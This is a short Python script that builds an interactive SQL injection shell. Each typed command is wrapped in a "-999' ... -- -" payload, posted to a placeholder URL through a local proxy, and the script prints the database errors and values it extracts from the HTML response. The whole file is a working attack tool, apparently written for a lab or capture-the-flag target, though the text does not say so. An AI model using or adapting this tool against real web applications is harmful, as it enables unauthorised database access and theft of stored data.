```python
# Sample Terminal application for SQL Injection.
#!/usr/bin/env python3

from cmd import Cmd
import requests
import re

url = "<URL>"
class Term(Cmd):
	prompt = "inject=> "
	
	def default(self, args):
		args = args.replace('"', '\\"')
		data = {
		"data": f"-999' {args}-- -"
		}
		proxy = {"http": "http://127.0.0.1:8080"}
		res = requests.post(url, data=data, proxies=proxy)
		# Regex for grepping error msg in the response
		sql_error = re.findall(r'Message: (.*?)</h1', res.text)
		# Regex for capturing every instance of the desired value => list format
		parse_response = re.findall(r'<div class="country">(.*?)</div>', res.text)

		try:
			if "Message:" in res.text:
				error = re.findall(r'Message: (.*?)</h1', res.text, flags=re.S)
				print(error[0])
			elif len(parse_response) < 4:
				# Print multiline sql response
				m = re.findall(r'<div class="country">(.*?)</div>', res.text, flags=re.S)
				print(m[2])
			else:
				print(parse_response[2])
		except Exception as e:
			print(e)

	def do_exit(self, args):
		return True


Term().cmdloop()

```
